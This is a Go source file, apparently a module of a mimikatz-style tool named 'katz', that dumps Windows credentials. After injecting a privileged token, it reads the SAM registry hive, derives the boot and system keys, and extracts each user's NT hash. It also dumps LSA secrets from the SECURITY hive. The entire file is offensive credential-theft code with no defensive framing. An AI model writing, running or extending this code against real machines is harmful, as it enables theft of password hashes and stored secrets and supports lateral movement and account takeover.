package modules

import (
	"encoding/hex"
	"fmt"
	"io"
	"katz/katz/modules/sam"
	"katz/katz/utils"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)
type printableSecret interface {
	PrintSecret(io.Writer)
}


func DumpSAM(token windows.Token) ([]*sam.Sam_account, error){
	var acc []*sam.Sam_account
	err := utils.InjectToken(token)
	if err != nil {
		return acc, err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account\Users`, registry.READ)
	if err != nil {
		return acc, fmt.Errorf("failed to open Users key: %w", err)
	}
	defer key.Close()
	subKeys, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return acc, fmt.Errorf("failed to read subkeys: %w", err)
	}

	bootKey, err := sam.GetBootKey(token)
	if err != nil {
		return acc, fmt.Errorf("failed to get boot key: %w", err)
	}

	systemKey, err := sam.GetSysKey(token, bootKey)
	if err != nil {
		return acc, fmt.Errorf("failed to get system key: %w", err)
	}
	for _, k := range subKeys {
		// Skip non-RID keys (like "Names")
		if len(k) != 8 {
			continue
		}

		// Parse RID from the key name
		rid, err := sam.ParseRIDFromKey(k)
		if err != nil {
			continue // Skip invalid RIDs
		}

		subKeyPath := fmt.Sprintf(`SAM\SAM\Domains\Account\Users\%s`, k)
		subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subKeyPath, registry.READ)
		if err != nil {
			continue
		}
		defer subKey.Close()

		subKeyData, err := subKey.ReadValueNames(-1)
		if err != nil {
			continue
		}

		// Check if this is a valid user entry (should have "V" value)
		if len(subKeyData) > 1 {
			v, _, err := subKey.GetBinaryValue("V")
			if err != nil {
				continue
			}

			data := sam.GetNT(v, rid, systemKey)
			acc = append(acc, &data)
		}
	}
	return acc, nil

}
func GetSysKey(token windows.Token) (result string, err error){
	err = utils.InjectToken(token)
	if err != nil {
		return 
	}
	bootKey, err := sam.GetBootKey(token)
	sysKey, err := sam.GetSysKey(token, bootKey)
	result = fmt.Sprintf("0x%s",hex.EncodeToString(sysKey))
	return
}
func GetBootKey(token windows.Token) (bootKey []byte, err error) {
	err = utils.InjectToken(token)
	if err != nil {
		return 
	}
	bootKey, err = sam.GetBootKey(token)
	return
}
func DumpLSASecrets(token windows.Token, bootkey []byte, VistaStyle bool, history bool) (result []*sam.PrintableLSASecret, err error){

	keySecrets := `SECURITY\Policy\Secrets`
	var secrets []string
	regkey, err := registry.OpenKey(registry.LOCAL_MACHINE, keySecrets, registry.READ)
	secrets, _ = regkey.ReadSubKeyNames(-1)
	newsecrets := make([]string, 0, len(secrets)*2)
	for i := range secrets {
		newsecrets = append(newsecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
		newsecrets = append(newsecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
	}
	lsaSecrets, err := sam.GetLSASecrets(token, bootkey, VistaStyle, history)
	if err != nil {
		panic(err)
	}
	for i := range lsaSecrets{
		result = append(result, &lsaSecrets[i])
	}
	return result, err
}
